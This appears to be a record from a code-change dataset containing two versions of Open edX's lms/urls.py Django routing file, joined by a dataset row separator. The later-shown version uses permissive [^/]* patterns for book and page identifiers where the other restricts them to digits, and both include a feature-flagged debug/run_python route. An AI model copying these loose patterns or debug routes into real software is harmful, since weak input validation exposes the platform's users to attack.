    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
39,39,4e4c209ae3deb4c78bcec89c181516af8604b450,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
